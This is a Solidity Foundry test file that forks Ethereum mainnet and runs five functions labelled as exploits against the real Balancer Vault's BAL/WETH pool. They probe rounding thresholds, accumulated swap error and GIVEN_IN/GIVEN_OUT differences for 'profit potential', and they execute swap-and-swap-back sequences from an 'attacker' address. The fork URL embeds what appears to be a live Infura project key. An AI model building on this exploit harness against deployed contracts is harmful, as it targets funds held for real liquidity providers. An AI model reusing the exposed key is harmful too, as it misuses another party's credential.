// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// ============================================================================
// TARGETED EXPLOITS based on findings:
// 1. Zero output threshold exploitation
// 2. Accumulated error exploitation
// 3. Rounding direction exploitation
// ============================================================================

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }

    struct BatchSwapStep {
        bytes32 poolId;
        uint256 assetInIndex;
        uint256 assetOutIndex;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function batchSwap(SwapKind kind, BatchSwapStep[] memory swaps, IAsset[] memory assets, FundManagement memory funds, int256[] memory limits, uint256 deadline) external payable returns (int256[] memory);
    function queryBatchSwap(SwapKind kind, BatchSwapStep[] memory swaps, IAsset[] memory assets, FundManagement memory funds) external returns (int256[] memory);
}

contract BalancerTargetedExploit is Test {
    IVault constant VAULT = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant BAL = IERC20(0xba100000625a3754423978a60c9317c58a424e3D);

    bytes32 constant BAL_WETH_POOL = 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014;

    address attacker;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        attacker = address(this);
        vm.deal(attacker, 1000 ether);
        WETH.deposit{value: 500 ether}();
        WETH.approve(address(VAULT), type(uint256).max);
        BAL.approve(address(VAULT), type(uint256).max);
    }

    // ========================================================================
    // EXPLOIT 1: Find exact zero-output threshold
    // Binary search to find the minimum amount that gives non-zero output
    // ========================================================================
    function test_FindZeroOutputThreshold() public {
        console.log("=== FINDING ZERO OUTPUT THRESHOLD ===");

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // Binary search between 0 and 10 gwei
        uint256 low = 0;
        uint256 high = 10e9; // 10 gwei

        while (high - low > 1) {
            uint256 mid = (low + high) / 2;

            IVault.BatchSwapStep[] memory swaps = new IVault.BatchSwapStep[](1);
            swaps[0] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: mid,
                userData: ""
            });

            try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swaps, assets, funds) returns (int256[] memory d) {
                uint256 balOut = uint256(-d[0]);
                if (balOut == 0) {
                    low = mid;
                } else {
                    high = mid;
                }
            } catch {
                low = mid;
            }
        }

        console.log("Zero output threshold (wei):", high);
        console.log("That is (gwei):", high / 1e9);

        // Test just below and at threshold
        IVault.BatchSwapStep[] memory swaps1 = new IVault.BatchSwapStep[](1);
        swaps1[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 1,
            assetOutIndex: 0,
            amount: high - 1,
            userData: ""
        });

        int256[] memory d1 = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swaps1, assets, funds);
        console.log("At threshold-1:", uint256(-d1[0]), "BAL");

        swaps1[0].amount = high;
        int256[] memory d2 = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swaps1, assets, funds);
        console.log("At threshold:", uint256(-d2[0]), "BAL");

        swaps1[0].amount = high + 1;
        int256[] memory d3 = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swaps1, assets, funds);
        console.log("At threshold+1:", uint256(-d3[0]), "BAL");
    }

    // ========================================================================
    // EXPLOIT 2: Compare single large swap vs many small swaps
    // The accumulated error should favor one direction
    // ========================================================================
    function test_SingleVsManySwapsComparison() public {
        console.log("=== SINGLE VS MANY SWAPS COMPARISON ===");

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        uint256 totalAmount = 10 ether;

        // Single swap of 10 ETH
        IVault.BatchSwapStep[] memory single = new IVault.BatchSwapStep[](1);
        single[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 1,
            assetOutIndex: 0,
            amount: totalAmount,
            userData: ""
        });

        int256[] memory singleD = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, single, assets, funds);
        uint256 singleOut = uint256(-singleD[0]);
        console.log("Single 10 ETH swap -> BAL:", singleOut);

        // 10 swaps of 1 ETH each
        IVault.BatchSwapStep[] memory ten = new IVault.BatchSwapStep[](10);
        for (uint256 i = 0; i < 10; i++) {
            ten[i] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: 1 ether,
                userData: ""
            });
        }

        int256[] memory tenD = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, ten, assets, funds);
        uint256 tenOut = uint256(-tenD[0]);
        console.log("10 x 1 ETH swaps -> BAL:", tenOut);

        // 100 swaps of 0.1 ETH each
        IVault.BatchSwapStep[] memory hundred = new IVault.BatchSwapStep[](100);
        for (uint256 i = 0; i < 100; i++) {
            hundred[i] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: 0.1 ether,
                userData: ""
            });
        }

        int256[] memory hundredD = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, hundred, assets, funds);
        uint256 hundredOut = uint256(-hundredD[0]);
        console.log("100 x 0.1 ETH swaps -> BAL:", hundredOut);

        // Compare
        console.log("\nDifference single vs 10:", singleOut > tenOut ? singleOut - tenOut : tenOut - singleOut);
        console.log("Difference single vs 100:", singleOut > hundredOut ? singleOut - hundredOut : hundredOut - singleOut);
        console.log("Difference 10 vs 100:", tenOut > hundredOut ? tenOut - hundredOut : hundredOut - tenOut);

        // Which is better?
        if (singleOut > tenOut && singleOut > hundredOut) {
            console.log("\n=> SINGLE SWAP IS BEST");
        } else if (tenOut > singleOut && tenOut > hundredOut) {
            console.log("\n=> 10 SWAPS IS BEST");
        } else {
            console.log("\n=> 100 SWAPS IS BEST");
        }
    }

    // ========================================================================
    // EXPLOIT 3: GIVEN_IN vs GIVEN_OUT at threshold amounts
    // ========================================================================
    function test_GivenInVsOutAtThreshold() public {
        console.log("=== GIVEN_IN VS GIVEN_OUT AT THRESHOLD ===");

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // Test at various amounts
        uint256[] memory amts = new uint256[](8);
        amts[0] = 5e9;      // 5 gwei
        amts[1] = 1e10;     // 10 gwei
        amts[2] = 1e11;     // 100 gwei
        amts[3] = 1e12;     // 0.000001 ETH
        amts[4] = 1e13;     // 0.00001 ETH
        amts[5] = 1e14;     // 0.0001 ETH
        amts[6] = 1e15;     // 0.001 ETH
        amts[7] = 1e16;     // 0.01 ETH

        for (uint256 i = 0; i < amts.length; i++) {
            uint256 amt = amts[i];
            console.log("\n--- Amount:", amt, "wei ---");

            // GIVEN_IN: swap amt WETH -> ? BAL
            IVault.BatchSwapStep[] memory swapIn = new IVault.BatchSwapStep[](1);
            swapIn[0] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: amt,
                userData: ""
            });

            try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swapIn, assets, funds) returns (int256[] memory dIn) {
                uint256 balOut = uint256(-dIn[0]);
                console.log("GIVEN_IN WETH:", amt);
                console.log("GIVEN_IN BAL:", balOut);

                if (balOut > 0) {
                    // GIVEN_OUT: swap ? WETH -> balOut BAL
                    IVault.BatchSwapStep[] memory swapOut = new IVault.BatchSwapStep[](1);
                    swapOut[0] = IVault.BatchSwapStep({
                        poolId: BAL_WETH_POOL,
                        assetInIndex: 1,
                        assetOutIndex: 0,
                        amount: balOut,
                        userData: ""
                    });

                    try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_OUT, swapOut, assets, funds) returns (int256[] memory dOut) {
                        uint256 wethNeeded = uint256(dOut[1]);
                        console.log("GIVEN_OUT WETH:", wethNeeded);
                        console.log("GIVEN_OUT BAL:", balOut);

                        if (wethNeeded < amt) {
                            uint256 diff = amt - wethNeeded;
                            console.log("PROFIT POTENTIAL (wei):", diff);
                        } else if (wethNeeded > amt) {
                            console.log("Loss (wei):", wethNeeded - amt);
                        }
                    } catch {}
                }
            } catch {
                console.log("GIVEN_IN failed");
            }
        }
    }

    // ========================================================================
    // EXPLOIT 4: Exploit slippage in batch operations
    // ========================================================================
    function test_BatchSlippageExploit() public {
        console.log("=== BATCH SLIPPAGE EXPLOIT ===");

        uint256 wethStart = WETH.balanceOf(attacker);
        uint256 balStart = BAL.balanceOf(attacker);

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // Strategy: Do many small swaps in one direction, then one large swap back
        uint256 numSmall = 100;
        uint256 smallAmt = 0.1 ether;
        uint256 totalSmall = numSmall * smallAmt;

        console.log("Step 1: Query", numSmall, "small swaps");

        IVault.BatchSwapStep[] memory smallSwaps = new IVault.BatchSwapStep[](numSmall);
        for (uint256 i = 0; i < numSmall; i++) {
            smallSwaps[i] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: smallAmt,
                userData: ""
            });
        }

        int256[] memory smallD = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, smallSwaps, assets, funds);
        uint256 balFromSmall = uint256(-smallD[0]);
        console.log("  Would get:", balFromSmall, "BAL");

        // Query single large swap
        console.log("\nStep 2: Query 1 large swap of same total");
        IVault.BatchSwapStep[] memory largeSwap = new IVault.BatchSwapStep[](1);
        largeSwap[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 1,
            assetOutIndex: 0,
            amount: totalSmall,
            userData: ""
        });

        int256[] memory largeD = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, largeSwap, assets, funds);
        uint256 balFromLarge = uint256(-largeD[0]);
        console.log("  Would get:", balFromLarge, "BAL");

        // The difference
        if (balFromSmall > balFromLarge) {
            console.log("\nSmall swaps give MORE BAL by:", balFromSmall - balFromLarge);
        } else {
            console.log("\nLarge swap gives MORE BAL by:", balFromLarge - balFromSmall);
        }

        // Now actually execute the better option
        console.log("\nStep 3: Execute the better strategy and swap back");

        int256[] memory limits = new int256[](2);
        limits[0] = 0;
        limits[1] = int256(totalSmall);

        // Execute large swap (usually better for price)
        VAULT.batchSwap(IVault.SwapKind.GIVEN_IN, largeSwap, assets, funds, limits, block.timestamp + 1000);

        uint256 balGot = BAL.balanceOf(attacker) - balStart;
        console.log("Actual BAL received:", balGot);

        // Swap back using GIVEN_OUT to get exact WETH
        IVault.BatchSwapStep[] memory backSwap = new IVault.BatchSwapStep[](1);
        backSwap[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 0,
            assetOutIndex: 1,
            amount: totalSmall,
            userData: ""
        });

        limits[0] = int256(balGot);
        limits[1] = 0;

        try VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, backSwap, assets, funds, limits, block.timestamp + 1000) {
            uint256 wethEnd = WETH.balanceOf(attacker);
            uint256 balEnd = BAL.balanceOf(attacker);

            console.log("\nFinal state:");
            console.log("  WETH change:", wethEnd > wethStart ? int256(wethEnd - wethStart) : -int256(wethStart - wethEnd));
            console.log("  BAL change:", balEnd > balStart ? int256(balEnd - balStart) : -int256(balStart - balEnd));
        } catch {
            console.log("Back swap failed");
        }
    }

    // ========================================================================
    // EXPLOIT 5: Find maximum profitable batch size
    // ========================================================================
    function test_FindOptimalBatchSize() public {
        console.log("=== FINDING OPTIMAL BATCH SIZE ===");

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        uint256 totalAmount = 10 ether;
        uint256 bestSize = 1;
        uint256 bestOutput = 0;

        uint256[] memory sizes = new uint256[](7);
        sizes[0] = 1;
        sizes[1] = 2;
        sizes[2] = 5;
        sizes[3] = 10;
        sizes[4] = 20;
        sizes[5] = 50;
        sizes[6] = 100;

        for (uint256 s = 0; s < sizes.length; s++) {
            uint256 size = sizes[s];
            uint256 amtPerSwap = totalAmount / size;

            IVault.BatchSwapStep[] memory swaps = new IVault.BatchSwapStep[](size);
            for (uint256 i = 0; i < size; i++) {
                swaps[i] = IVault.BatchSwapStep({
                    poolId: BAL_WETH_POOL,
                    assetInIndex: 1,
                    assetOutIndex: 0,
                    amount: amtPerSwap,
                    userData: ""
                });
            }

            try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swaps, assets, funds) returns (int256[] memory d) {
                uint256 balOut = uint256(-d[0]);
                console.log("Size:", size);
                console.log("  BAL:", balOut);

                if (balOut > bestOutput) {
                    bestOutput = balOut;
                    bestSize = size;
                }
            } catch {
                console.log("Size", size, "-> FAILED");
            }
        }

        console.log("\nBest batch size:", bestSize);
        console.log("Best output:", bestOutput, "BAL");
    }

    receive() external payable {}
}
